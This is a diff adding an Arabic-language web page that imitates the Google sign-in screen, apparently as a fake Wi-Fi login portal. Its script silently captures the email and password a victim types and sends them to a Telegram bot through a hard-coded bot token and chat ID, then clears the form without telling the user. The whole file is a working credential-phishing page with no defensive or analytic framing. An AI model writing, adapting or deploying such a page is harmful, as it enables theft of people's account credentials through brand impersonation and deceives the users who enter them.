@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول إلى Google</title>
+
+  <link rel="stylesheet" href="css2.css">
+</head>
+<body>
+  <div class="box">
+    <form id="wifiForm" class="form">
+      <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="شعار Google">
+      <h1 class="form-title">تسجيل الدخول</h1>
+
+      <div class="form-group">
+        <input type="text" class="form-control" name="email" id="email" required>
+        <label for="email" class="form-label">البريد الإلكتروني</label>
+      </div>
+
+      <div class="form-group">
+        <input type="password" class="form-control" name="password" id="password" required>
+        <label for="password" class="form-label">كلمة المرور</label>
+      </div>
+
+      <div class="form-group">
+        <label class="showLabel">
+          <input type="checkbox" id="show">
+          عرض كلمة المرور
+        </label>
+      </div>
+
+      <div class="bottom-box">
+        <a href="#">هل نسيت كلمة المرور؟</a>
+        <button type="submit" class="form-button">إرسال</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    // Show/hide password toggle
+    document.getElementById("show").addEventListener("change", function() {
+      const passwordInput = document.getElementById("password");
+      passwordInput.type = this.checked ? "text" : "password";
+    });
+
+    // Submit handler (no alerts shown to user)
+    document.getElementById("wifiForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const message = `📶Login info:\n👤 Email: ${email}\n🔐 Password: ${password}`;
+
+      const botToken = '8007902539:AAGznIv_m-SljUGC_zbdXli0PkQWQksbHcc'; // ⛔ Replace this securely
+      const chatId = '1562595173';     // ⛔ Replace this securely
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+
+      // Reset the form silently after submission
+      this.reset();
+    });
+  </script>
+</body>
+</html>
